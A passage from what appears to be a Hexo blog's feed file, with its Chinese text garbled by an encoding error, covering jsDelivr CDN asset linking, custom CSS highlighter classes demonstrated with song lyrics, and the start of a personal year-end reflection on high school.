·å°±é¿å…äº†åç§°é‡å¤</span></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">â”œâ”€css</span><br><span class="line">â”œâ”€images</span><br><span class="line">â”‚  â”œâ”€ArticlePic</span><br><span class="line">â”‚  â””â”€Cover</span><br><span class="line">â””â”€js</span><br></pre></td></tr></table></figure><h4 id="æ–‡ç« ä¸­çš„åº”ç”¨"><a href="#æ–‡ç« ä¸­çš„åº”ç”¨" class="headerlink" title="æ–‡ç« ä¸­çš„åº”ç”¨"></a>æ–‡ç« ä¸­çš„åº”ç”¨</h4><p>åœ¨ä½¿ç”¨è¿™ä¸ªæ–¹æ¡ˆä¹‹å‰ï¼Œæˆ‘åœ¨æ–‡ç« ä¸­æ’å…¥å›¾ç‰‡çš„åšæ³•æ˜¯å°†å›¾ç‰‡å…ˆè½¬æ¢æˆ base64 çš„ç¼–ç ï¼Œç„¶ååœ¨ Markdown ä¸­ä½œä¸ºä¸€ä¸ªæ³¨é‡Šæ’å…¥ï¼Œç„¶ååœ¨æ–‡ä¸­å¼•ç”¨ã€‚å¥½å¤„æ˜¯æ–‡ç« å°±æ˜¯å®Œå…¨æ•´ä½“ï¼Œä¸ç®¡æ€ä¹ˆç§»åŠ¨ä½ç½®ï¼Œå›¾ç‰‡å§‹ç»ˆå®Œå¥½ã€‚ç¼ºç‚¹å°±æ˜¯ä¸€é•¿ä¸²çš„ç¼–ç æ‰°ä¹±äº†å­—æ•°ç»Ÿè®¡ç³»ç»Ÿï¼Œç»™å„ç§ç»´æŠ¤å¸¦æ¥ä¸ä¾¿ã€‚å†è€…ï¼Œå†™æ–‡ç« çš„ä½“éªŒä¹Ÿå—åˆ°äº†å½±å“ã€‚</p><h4 id="jsDelivr-çš„æ“ä½œ"><a href="#jsDelivr-çš„æ“ä½œ" class="headerlink" title="jsDelivr çš„æ“ä½œ"></a>jsDelivr çš„æ“ä½œ</h4><h5 id="èµ„æºå¼•ç”¨"><a href="#èµ„æºå¼•ç”¨" class="headerlink" title="èµ„æºå¼•ç”¨"></a>èµ„æºå¼•ç”¨</h5><p>æ ¹æ® jsDelivr çš„è§„åˆ™ï¼Œå¯¹äº repo çš„ release ï¼Œå¯ä»¥è¿™æ ·è®¿é—®å…¶ä¸­èµ„æºï¼Œä½†æ˜¯å¯¹èµ„æºæœ‰å¤§å°é™åˆ¶</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;&#123;GitHubç”¨æˆ·å&#125;&#x2F;&#123;repoå&#125;@&#123;releaseç‰ˆæœ¬å·&#125;&#x2F;&#123;repoä¸­çš„æ–‡ä»¶è·¯å¾„&#125;&#x2F;&#123;æ–‡ä»¶å&#125;</span><br></pre></td></tr></table></figure><p>ç‰¹åˆ«åœ°ï¼Œå¯ä»¥ä¸æŒ‡å®š <code>&#123;releaseç‰ˆæœ¬å·&#125;</code> æ¥ä¿æŒæœ€æ–°ã€‚å®˜æ–¹ä¸å»ºè®®ç”¨äºå®é™…ä¸Šçº¿çš„é¡¹ç›®ä¸­ã€‚ <span class="HighlightWKT7BlueGreen">å®æµ‹å¿½ç•¥ç‰ˆæœ¬å·å¯èƒ½ä¼šåœ¨çŸ­æœŸä¹‹å†…å¼•ç”¨ä¸Šä¸€ä¸ªç‰ˆæœ¬çš„åŒåèµ„æºï¼ˆä¹Ÿå°±æ˜¯æ²¡æœ‰æ›´æ–°çš„æ ·å­ï¼‰</span> ä¸è¿‡æŒ‡å®šä¸€ä¸ªç‰ˆæœ¬å·çš„èŒƒå›´ä¹Ÿæ˜¯æ²¡æœ‰é—®é¢˜çš„ï¼Œè­¬å¦‚ 1.5.x éƒ½å¯ä»¥å†™ä½œ 1.5 ã€‚æ­¤å¤–ï¼Œä¹Ÿå¯ä»¥é€šè¿‡ commit åºå·æ¥è·å–èµ„æºï¼Œåªéœ€è¦å°† <code>&#123;releaseç‰ˆæœ¬å·&#125;</code> æ”¹æˆ <code>&#123;commitåºå·&#125;</code> å³å¯ã€‚</p><p>è¿˜æœ‰ä¸€ä¸ªæˆ‘æŒºå–œæ¬¢çš„åŠŸèƒ½ï¼Œåœ¨ CSS/JS æ–‡ä»¶æ‹“å±•åçš„åé¢åŠ ä¸Š <code>.min</code> å°±èƒ½è‡ªåŠ¨ç”Ÿæˆä¸€ä¸ªè¯¥æºæ–‡ä»¶çš„å‹ç¼©ç‰ˆæœ¬ã€‚</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*ORIGINAL*/</span></span><br><span class="line"><span class="comment">/*https://cdn.jsdelivr.net/gh/LemonPrefect/sDelivr@1.5.1/css/layout.page.friends.css*/</span></span><br><span class="line"><span class="selector-class">.friendLink-Area</span>&#123;</span><br><span class="line">    <span class="attribute">margin-top</span>: <span class="number">6px</span>;</span><br><span class="line">    <span class="attribute">margin-bottom</span>: <span class="number">18px</span>;</span><br><span class="line">    <span class="attribute">text-align</span>: center;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.friendLink-Area</span> <span class="selector-tag">a</span>&#123;</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#363636</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.friendLink-square</span>&#123;</span><br><span class="line">    <span class="attribute">margin-top</span>: <span class="number">4px</span> <span class="meta">!important</span>;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">280px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">110px</span>;</span><br><span class="line">    <span class="attribute">display</span>: inline-block;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">0.5em</span> <span class="number">0.75em</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.friendLink-square</span><span class="selector-pseudo">:hover</span>&#123;</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="number">#f5f5f5</span>;</span><br><span class="line">    <span class="attribute">background</span>: <span class="number">#f5f5f5</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*PROCESSED*/</span></span><br><span class="line"><span class="comment">/*https://cdn.jsdelivr.net/gh/LemonPrefect/sDelivr@1.5.1/css/layout.page.friends.min.css*/</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Minified by jsDelivr using clean-css v4.2.1.</span></span><br><span class="line"><span class="comment"> * Original file: /gh/LemonPrefect/sDelivr@1.5.1/css/layout.page.friends.css</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Do NOT use SRI with dynamically generated files! More information: https://www.jsdelivr.com/using-sri-with-dynamic-files</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="selector-class">.friendLink-Area</span>&#123;<span class="attribute">margin-top</span>:<span class="number">6px</span>;<span class="attribute">margin-bottom</span>:<span class="number">18px</span>;<span class="attribute">text-align</span>:center&#125;<span class="selector-class">.friendLink-Area</span> <span class="selector-tag">a</span>&#123;<span class="attribute">color</span>:<span class="number">#363636</span>&#125;<span class="selector-class">.friendLink-square</span>&#123;<span class="attribute">margin-top</span>:<span class="number">4px</span><span class="meta">!important</span>;<span class="attribute">width</span>:<span class="number">280px</span>;<span class="attribute">height</span>:<span class="number">110px</span>;<span class="attribute">display</span>:inline-block;<span class="attribute">padding</span>:.<span class="number">5em</span> .<span class="number">75em</span>&#125;<span class="selector-class">.friendLink-square</span><span class="selector-pseudo">:hover</span>&#123;<span class="attribute">background-color</span>:<span class="number">#f5f5f5</span>;<span class="attribute">background</span>:<span class="number">#f5f5f5</span>&#125;</span><br><span class="line"><span class="comment">/*# sourceMappingURL=/sm/3fbc473b94f2ce6d04583f788bcf2562f42fb136b727e2ff5354d6a30849cf80.map */</span></span><br></pre></td></tr></table></figure><h5 id="ç»Ÿè®¡ä¿¡æ¯"><a href="#ç»Ÿè®¡ä¿¡æ¯" class="headerlink" title="ç»Ÿè®¡ä¿¡æ¯"></a>ç»Ÿè®¡ä¿¡æ¯</h5><p>jsDelivr å¾ˆè´´å¿ƒåœ°ç»™äº†ä¸€ä¸ªèµ„æºå¼•ç”¨çš„ç»Ÿè®¡é¡µé¢ï¼Œå…·ä½“åˆ°äº†æ¯ä¸€ä¸ªèµ„æºçš„æ¬¡æ•°ã€‚é€šè¿‡ä»¥ä¸‹åœ°å€å¯ä»¥å…·ä½“æŸ¥çœ‹ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.jsdelivr.com&#x2F;package&#x2F;gh&#x2F;&#123;GitHubç”¨æˆ·å&#125;&#x2F;&#123;repoå&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œé™„ä¸Šæˆ‘çš„ repo èµ„æºè®¿é—®æ€»æ•°</p><pa><p><a href="https://www.jsdelivr.com/package/gh/LemonPrefect/sDelivr"><img src="https://data.jsdelivr.com/v1/package/gh/LemonPrefect/sDelivr/badge"></a></p></pa>]]></content>
      
      
      <categories>
          
          <category> Daily </category>
          
      </categories>
      
      
        <tags>
            
            <tag> BlogExpImp. </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç»™æˆ‘çš„Highlightsä¸Šç‚¹è‰²</title>
      <link href="/zh-CN/posts/9b201137.html"/>
      <url>/zh-CN/posts/9b201137.html</url>
      
        <content type="html"><![CDATA[<p>æŸå¤§ä½¬ç¾¤é‡Œçš„äººçªç„¶å¼€å§‹æµè¡Œèµ·å†™è¯­é›€æ¥ï¼Œçœ‹äº†ä¸€åœˆçš„æˆ‘æƒ³èµ·äº†å¾ˆä¹…ä»¥æ¥ä¸€ç›´æƒ³å¼„çš„ä¸œè¥¿â€”â€”ç”¨ blog åšå‡ºå¯è¯»æ€§å¼ºçš„ç¬”è®°ã€‚ä¹‹å‰é«˜ä¸­çš„æ—¶å€™ç”¨è¿‡ç±»ä¼¼çš„ä¸œè¥¿å†™ç¬”è®°ï¼Œä½†æ˜¯ç”±äºå±€é™æ€§ï¼Œå¾ˆå¤šä¸œè¥¿ä»ç„¶æ— æ³•ä»£æ›¿åœ°éœ€è¦æ‰‹å†™ï¼Œå› æ­¤ä½“éªŒä¸€ç›´ä¸å¥½ã€‚åˆšå¥½å¯’å‡ä¹Ÿæœ‰äº›ç»†ç¢çš„æ—¶é—´ï¼Œå°±æ­¤å®šä¸‹ä¸€ä¸ªè®¡åˆ’æ¥ä¸€ç‚¹ä¸€ç‚¹æŠŠå®ƒå˜æˆæˆ‘æƒ³è¦çš„æ ·å­ã€‚<span class="HighlightWKT7BlueGreen">å› ä¸ºä¸»è¦æ³¨é‡ä½“éªŒæ”¹å–„ï¼Œæ‰€ä»¥è¿™ä¸ªç³»åˆ—çš„æ–‡ç« éƒ½ä¼šåç»†ç¢ã€åç®€å•ã€‚</span>è¿™ä¹Ÿå°±æ˜¯ <code>Plan spare = new Plan();</code> çš„æ¥æºäº†ã€‚è¿™æ˜¯è¿™ä¸ªç³»åˆ—çš„ç¬¬ä¸€ç¯‡ï¼Œä¹Ÿç®—ä¸€ä¸ªå¥½çš„å¼€å¤´ã€‚</p><p><escape><span id="more"></span></escape></p><h4 id="é¢œè‰²çš„æ‰§å¿µ"><a href="#é¢œè‰²çš„æ‰§å¿µ" class="headerlink" title="é¢œè‰²çš„æ‰§å¿µ"></a>é¢œè‰²çš„æ‰§å¿µ</h4><p>ä¸€ç›´ä»¥æ¥æˆ‘éƒ½è®¤ä¸ºé¢œè‰²åœ¨ç¬”è®°ä¸­çš„åœ°ä½æ˜¯æ— å¯å–ä»£çš„ï¼Œæ— è®ºæ˜¯åŒºåˆ†é‡ç‚¹æŠ‘æˆ–æ˜¯åŒºåˆ†å±‚æ¬¡ï¼Œé¢œè‰²éƒ½æ˜¯æœ€ä½³è½½ä½“ã€‚è€Œä¸”é¢œè‰²å¯ä»¥å¸®åŠ©è‡ªå·±å½¢æˆç‹¬æœ‰çš„è®°å¿†ã€‚åŠ ä¹‹æˆ‘ä¸€ç›´å–œæ¬¢ç©å„å¼å„æ ·å½©è‰²çš„å¢¨æ°´ã€‚<span class="heimu" title="æœ‰ä¸€è¯´ä¸€">ç©å¾—æ·±å…¥çœŸçš„å¾ˆèŠ±é’±</span> æ‰€ä»¥ï¼Œblog æ€ä¹ˆèƒ½æ²¡æœ‰è§å…‰ç¬”è¿™ç§ä¸œè¥¿å‘¢ï¼</p><h4 id="ç›´æ¥å†²CSS"><a href="#ç›´æ¥å†²CSS" class="headerlink" title="ç›´æ¥å†²CSS"></a>ç›´æ¥å†²CSS</h4><p>æœ‰äº†ä¸Šæ¬¡é»‘å¹•çš„ç»éªŒï¼Œè¿™æ¬¡ä¸Šæ¥ç›´æ¥å¾€ css ä¸Šå†²ã€‚</p><p>æ—¢ç„¶æ˜¯è§å…‰ç¬”ï¼Œç…§ç€ Microsoft Edge çš„æ•ˆæœï¼Œç”¨ç®€å•çš„ <code>background</code> æ¥å®ç°å°±è¡Œå•¦ï¼äºæ˜¯é¡ºæ‰‹å†™ä¸‹ css</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.HighlightEdgeBlue</span>&#123;</span><br><span class="line">    <span class="attribute">background</span>: <span class="built_in">rgb</span>(<span class="number">166</span>, <span class="number">230</span>, <span class="number">255</span>);</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">0px</span> <span class="number">0px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Deploy åˆ°çº¿ä¸Šçœ‹äº†çœ‹ï¼Œå±…ç„¶æ•ˆæœè¿˜ä¸é”™ï¼Œäºæ˜¯ç…§è‘«èŠ¦ç”»ç“¢ï¼Œæ¥ç€ä»å–œæ¬¢çš„é¢œè‰²ä¸ŠæŒ‘äº†å‡ ç§ï¼Œç„¶åè°ƒæ•´äº†ä¸€ä¸‹é¢œè‰²çš„é€æ˜åº¦ã€‚</p><h4 id="ä¸Šçº¿"><a href="#ä¸Šçº¿" class="headerlink" title="ä¸Šçº¿"></a>ä¸Šçº¿</h4><p>æœ¬æ¥æ˜¯å‡†å¤‡ç›´æ¥åƒé»‘å¹•ä¸€æ ·æ”¾åœ¨æœ¬åœ°åŠ è½½ï¼Œä½†æ˜¯åæ¥å‘ç°äº† jsDelivr è¿™ä¸ªæŒºå¥½çš„ä¸œè¥¿ <span class="heimu" title="å˜¿å˜¿:)"><del>BlogåŠ è½½ç¼“æ…¢çš„é—®é¢˜ç»ˆäºæœ‰äº†äº›æ”¹å–„</del></span> äºæ˜¯ä¸€é¡¿æ“ä½œï¼Œåšå¥½ä¹‹åæ”¾åˆ° Github ä»“åº“é‡Œï¼Œå‘å¸ƒä»¥åç”¨ jsDelivr æ¥åŠ è½½ã€‚äº‹å®è¯æ˜å®ƒç¡®å®ä¸é”™ï¼ˆæˆ‘è¶…å–œæ¬¢è‡ªåŠ¨ç”Ÿæˆå‹ç¼©æ ¼å¼è¿™ä¸€ç‚¹ã€‚</p><p>åªéœ€è¦åœ¨ head.ejsï¼ˆå…¨å±€å¯ç”¨ï¼‰ æˆ–è€…æ–‡ç« ä¸­ï¼ˆå±€éƒ¨ä½¿ç”¨ï¼‰åŠ ä¸Šè¿™æ ·ä¸€å¥ï¼Œå°±å¯ä»¥ä½¿ç”¨ Highlight å•¦</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;https://cdn.jsdelivr.net/gh/LemonPrefect/sDelivr/css/var.highlight.min.css&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><h4 id="Sample"><a href="#Sample" class="headerlink" title="Sample"></a>Sample</h4><p>æœ¬æ¥æ˜¯ä¸å‡†å¤‡æ”¾ sample çš„ï¼Œä½†æ˜¯æˆ‘æ€• class åç§°å¤ªé•¿æˆ‘è‡ªå·±ä¹Ÿè®°ä¸ä½ã€‚ <span class="heimu" title="å˜¿å˜¿:)">çœŸå®</span></p><p>å…·ä½“æœ‰äº›å•¥é¢œè‰²å˜›ï¼Œ<a href="https://cdn.jsdelivr.net/gh/LemonPrefect/sDelivr/css/var.highlight.css">æˆ³è¿™é‡Œï¼</a></p><p>äºæ˜¯ï¼Œæ”¾ä¸Šæˆ‘å–œæ¬¢çš„æŸé¦–æ­Œçš„æ­Œè¯å’Œæˆ‘å¾ˆèœçš„ç¿»è¯‘ <span class="heimu" title="å˜¿å˜¿:)">ç‰¹æ„ç”¨äº†è¡¬çº¿å­—ä½“</span></p><p><span style="font-family:'Noto Serif SC';text-align:center">å½“<span class="HighlightEdgeYellow">å¤ªé˜³</span>å‡ è¹è¹å›å› é€è¿‡<span class="HighlightWKT7BlueGreen">è½¦çª—</span></span></p><p><span style="font-family:'Noto Serif SC';text-align:center">When the <span class="HighlightEdgeYellow">sun</span> rises, the sunlight goes through the <span class="HighlightWKT7BlueGreen">car windows</span>.</span></p><p><span style="font-family:'Noto Serif SC';text-align:center"><span class="HighlightEdgeBlue">æ¸…æ™¨</span>çš„é£å¾®å¾®æ³›ç€é¦™</span></p><p><span style="font-family:'Noto Serif SC';text-align:center">The <span class="HighlightEdgeBlue">dawn</span> wind blows with fragrance.</span></p><p><span style="font-family:'Noto Serif SC';text-align:center">è·¯è¿‡äº†ä¸­å±± åŸå¸‚é—´æ¢å¤<span class="HighlightEdgeYellow">ç¹åæ¨¡æ ·</span></span></p><p><span style="font-family:'Noto Serif SC';text-align:center">I went through Zhongshan, which city has recovered to be <span class="HighlightEdgeYellow">prosperous</span>.</span></p><p><span style="font-family:'Noto Serif SC';text-align:center">è€Œæˆ‘è¿™ä¸€æ¬¡è¦å»ä½•æ–¹</span></p><p><span style="font-family:'Noto Serif SC';text-align:center">However, what should I go this time?</span></p><p><span style="font-family:'Noto Serif SC';text-align:center">æ˜¨å¤œæƒ³äº†å¤ªä¹… é‚£ä¸ª<span class="HighlightWKT7Brown">è·¯å£</span>å“ªæœ‰</span></p><p><span style="font-family:'Noto Serif SC';text-align:center">I still couldnâ€™t find which <span class="HighlightWKT7Brown">cross</span> is the one after thinking for a long time last night sleeplessly.</span></p><p><span style="font-family:'Noto Serif SC';text-align:center">åœä¸‹ç­‰å€™è¿˜æ˜¯<span class="HighlightWechatOrange">ä¸€ç›´èµ°</span></span></p><p><span style="font-family:'Noto Serif SC';text-align:center">Should I stop to wait or <span class="HighlightWechatOrange">keep going</span>?</span></p>]]></content>
      
      
      <categories>
          
          <category> Daily </category>
          
      </categories>
      
      
        <tags>
            
            <tag> BlogExpImp. </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Youth</title>
      <link href="/zh-CN/posts/ca6442d1.html"/>
      <url>/zh-CN/posts/ca6442d1.html</url>
      
        <content type="html"><![CDATA[<h4 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h4><p>å…¶å®å¾ˆä¹…å°±æœ‰å†™å¹´åº¦æ€»ç»“çš„æƒ³æ³•äº†ï¼Œä½†æ˜¯å› ä¸ºä¸€ç›´æ²¡æœ‰ä¸€ä¸ªç¡®åˆ‡æ€è·¯ï¼Œå°±æ‹–ç€æ²¡å†™ã€‚ç›´åˆ°ç°åœ¨å†™çš„æ—¶å€™ï¼Œæˆ‘ä¹Ÿä¸çŸ¥é“åº”è¯¥å†™äº›å•¥ï¼Œå› æ­¤ï¼Œå°±éšå¿ƒå†™å§ã€‚<span class="heimu" title="å˜¿å˜¿:)">å‰æ–¹æ€è·¯æ··ä¹±é¢„è­¦</span></p><p><escape><span id="more"></span></escape></p><style>.article-body{    font-family: 'Noto serif SC',sans-serif;}</style><h4 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h4><p>åœ¨æˆ‘çš„å°è±¡é‡Œï¼Œ2019å¹´çš„ä¸ŠåŠå¹´ä¼¼ä¹æ¯”ä»¥å¾€æ›´é¡ºåˆ©äº†ä¸€äº›ã€‚ä¸€æ–¹é¢ï¼Œç¤¾å›¢å’Œå­¦ç”Ÿä¼šçš„å·¥ä½œå½»åº•åœ°æ”¾ä¸‹äº†ï¼Œä¸ç”¨å†è·Ÿåæ‰§çš„ç¤¾å›¢è€å¸ˆçº ç»“æ‚å¿—çš„æ’ç‰ˆã€‚è¿™ç®—æ˜¯æŠŠè‡ªå·±ä»ä¸€éƒ¨åˆ†çš„ç¹æ‚å½“ä¸­æŠ½äº†å‡ºæ¥ï¼Œæœ‰äº†æ›´å¤šæ—¶é—´èƒ½å¤Ÿè®©è‡ªå·±å®‰é™ä¸‹æ¥ï¼Œå¥½å¥½åœ°æ„Ÿå—ç”Ÿæ´»ã€æ„Ÿå—ç©ºæ°”çš„å‘³é“ã€‚å¦ä¸€æ–¹é¢ï¼Œç»è¿‡ä¸€ä¸ªå­¦æœŸçš„å°´å°¬äº¤æµä½¿æˆ‘å†æ¬¡æ”¾å¼ƒäººé™…å…³ç³»çš„æŒ£æ‰ï¼Œè¿™æ ·åå€’ä½¿è‡ªå·±è½»æ¾äº†ã€‚</p><p>æ²¡ä»€ä¹ˆäººé™…å…³ç³»ä¹‹ååå€’æ›´åŠ èƒ½æ¯«æ— é¡¾è™‘åœ°æœ‰ä¸€è¯´ä¸€äº†ï¼Œè¿˜å› ä¸ºæŸäº›äº‹æƒ…ä¸¾è¡Œäº†ä¸€æ¬¡å¹¶ä¸ç®—æˆåŠŸçš„å…¬æŠ•ä¸æ²¡æ€ä¹ˆä¸Šåœºçš„è¾©è®ºã€‚ç°åœ¨æƒ³èµ·æ¥ï¼Œå½“æ—¶çš„æƒ…ç»ªåº”è¯¥æ˜¯åˆ°äº†æŸç§å¥‡æ€ªçš„æè‡´ã€‚å¥½å°±å¥½åœ¨è¿˜æ˜¯æœ‰äº›æƒŠå–œæ”¯æ’‘ç€æ—¥å¸¸ï¼Œä¸è‡³äºç›´æ¥å´©æºƒã€‚<span class="heimu" title="å˜¿å˜¿:)">å…¶å®è¿˜æ˜¯æœ‰ä¸€æ¬¡</span></p><h4 id="The-Air-is-SOUR"><a href="#The-Air-is-SOUR" class="headerlink" title="The Air is SOUR"></a>The Air is SOUR</h4><p>æ·±äºŒå¤–å‚æ™šçš„é£ï¼Œå…¶å®æ˜¯å¸¦ç€æ·¡æ·¡çš„é…¸å‘³çš„ï¼Œåƒæ˜¯æŸ æª¬æ±æ•å£æ”¾ç½®ï¼Œé…¸å‘³éšç€ç©ºæ°”çš„æµåŠ¨å¼¥æ•£å¼€æ¥ï¼Œè‚†æ„å é¢†ç€æ¯ä¸€å¯¸å¤ªé˜³æ”¾å¼ƒçš„åœŸåœ°ã€‚æ¸æ¸åœ°ï¼Œå®ƒè¢«ä¸€è‚¡è‚¡çƒ­æ°”è£¹æŒŸç€è–°è¡£è‰çš„é¦™æ°”æ‰€è¦†ç›–ï¼Œç´§æ¥ç€çš„æ˜¯ä¸€è‚¡æµ“å¾—ä¸åƒå¹¿ä¸œçš„å’¸ç”œã€‚ä¼´éšç€æ˜†è™«çš„é¸£å«ï¼Œçƒ­é—¹çš„å¤œå¼€å§‹äº†ã€‚</p><h4 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h4><p>é«˜ä¸‰çš„ä¸‹åŠå­¦æœŸï¼Œæ•°å­¦å’Œè‹±è¯­åƒåˆ†æ‰‹äº†çš„å°‘å¹´ä¸€æ ·äº’ç›¸ç¦»å¾—è¶Šæ¥è¶Šè¿œã€‚è¿™å…¶ä¸­çš„ç¼˜ç”±ï¼Œæˆ‘ä¹Ÿä¸ç”šå…¶è§£ã€‚ä½†æ˜¯å…¶ä¸­ç”±æ•°å­¦å¸¦æ¥çš„ç»æœ›éƒ½è¢«è‹±è¯­æ´—åˆ·ä¸€ç©ºäº†ã€‚çƒ­é—¹çš„å¤œé‡Œï¼Œæˆ‘ååœ¨Colinçš„æ–œåæ–¹çœ‹ç€ä»–æ”¹è‹±è¯­å·å­ã€åœ¨Phoenixçš„æ—è¾¹ä¸€èµ·å†™Colinè¿‡å‡ å¤©å°±è¦å‘çš„å·å­ã€åœ¨ç”µè„‘å‰æ‚„æ‚„æ•´ç†æ–°å‡ºçš„è‹±è¯­å·å­ã€åœ¨ç†„ç¯åçš„èµ°å»Šä¸Šå†™è‹±è¯­å·å­ã€‚è¿™æ ·ä¸€å¤©ä¸­å¤§éƒ¨åˆ†æ—¶é—´åœ¨å†™è‹±è¯­çš„æ—¥å­ç«Ÿä¸€åº¦æˆä¸ºäº†æˆ‘çš„æŸç§ç²¾ç¥æ”¯æŸ±ã€‚</p><h4 id="The-Moon-is-Bright"><a href="#The-Moon-is-Bright" class="headerlink" title="The Moon is Bright"></a>The Moon is Bright</h4><p>ç­‰å¤§éƒ¨åˆ†çš„ç”µç¯åœ¨è§’è½é‡Œæ­‡ä¸‹äº†ï¼Œè¿™çƒ­é—¹çš„å¤œå°±ç®—ç»“æŸäº†ã€‚é™¤äº†æ˜æ™ƒæ™ƒçš„æœˆäº®ï¼Œ<span class="heimu" title="å˜¿å˜¿:)">å’Œé«˜è€ƒå€’è®¡æ—¶çš„å±å¹•</span>æ²¡æœ‰äººèƒ½å¤ŸçŸ¥é“ä¼šæœ‰ä¸¤ä¸ªå¯å¯çˆ±çˆ±çš„äººé”™å¼€å¤§å®¶çš„æ—¶é—´çº¿ï¼Œæ‚„æ‚„åœ°æ¬£èµç€æœˆäº®ã€‚æœˆäº®å€’æ˜¯æ—©å°±å‘ç°äº†ï¼Œæ˜¯ç”µç¯å‘Šè¯‰å®ƒçš„ï¼Œå› ä¸ºæ€»æ˜¯ç†Ÿæ‚‰çš„ä¸¤ä¸ªäººæŠŠå®ƒå…³ä¸Šã€‚å¯æ˜¯ï¼Œç”µç¯å’Œæœˆäº®ä¸€å®šéƒ½æ²¡æƒ³åˆ°ï¼Œè¿™æ ·çš„åœºæ™¯åœ¨é«˜è€ƒä»¥åå°±ä¸å¤å­˜åœ¨äº†ï¼Œè¿™ä¸èƒ½æ€ªä»–ä»¬ï¼Œæ¯•ç«Ÿä»–ä»¬ä»€ä¹ˆä¹Ÿåšä¸äº†ã€‚</p><h4 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h4><p>å…¶å®æˆ‘åˆ°ç°åœ¨ä¹Ÿè¿˜è§‰å¾—ä¸å¯æ€è®®ï¼Œæˆ‘å±…ç„¶è¿ç»­ä¸€å¹´å’Œä»–ååœ¨ä¸€èµ·åƒåˆé¥­ï¼Œå‡ ä¹ä»ä¸é—´æ–­ã€‚åˆé¥­çš„æ—¶é—´å¯¹äºæˆ‘æ¥è¯´æ— ç–‘æ˜¯å¿«ä¹çš„ã€‚åœ¨æ¯å¤©è¿‘åŠä¸ªå°æ—¶çš„æ—¶å…‰é‡Œï¼Œæˆ‘å‡ ä¹èƒ½æŠŠä¸€å¤©æ‰€è¦è¯´çš„è¯ä¸€æ¬¡æ€§éƒ½è¯´å®Œï¼Œè€Œåå›åˆ°å®¿èˆï¼Œæ¢å¤å¹³é™ï¼Œæ‹¿èµ·è‹±è¯­å·å­ï¼Œå¼€å§‹å†™é¢˜ã€‚</p><h4 id="Keep-Secret"><a href="#Keep-Secret" class="headerlink" title="Keep Secret"></a>Keep Secret</h4><p>å¯‚é™çš„å¤œé‡Œï¼Œæœ€å…ˆçŸ¥é“ä¸€åˆ‡çš„ï¼Œä¸€å®šæ˜¯æ•å¤´ã€‚ä»–å°å¿ƒåœ°ä¿å®ˆç€å°‘å¹´åœ¨å¤œé‡Œçš„è¯´è¿‡çš„è¯ã€æƒ³è¿‡çš„äº‹ï¼Œä¸è®©å…¶ä»–çš„äººçŸ¥é“å°‘å¹´çš„ç§˜å¯†ã€‚ä»–å°†è¿™ä¸€åˆ‡è—è¿›ä»–æŸ”è½¯çš„å†…å¿ƒï¼Œå’Œè¢«å­ä¸€èµ·ç”¨æš–å’ŒæŠšå¹³ç€å°‘å¹´èµ·ä¼çš„æƒ…ç»ªã€‚</p><h4 id="0x05"><a href="#0x05" class="headerlink" 